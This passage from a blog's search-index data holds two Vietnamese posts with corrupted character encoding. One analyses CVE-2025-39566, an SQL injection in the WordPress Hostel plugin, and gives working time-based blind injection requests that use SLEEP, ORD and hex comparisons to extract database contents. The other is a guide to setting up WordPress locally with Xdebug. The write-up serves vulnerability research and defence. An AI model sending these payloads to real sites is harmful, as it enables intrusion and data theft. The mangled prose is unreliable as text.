\u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° 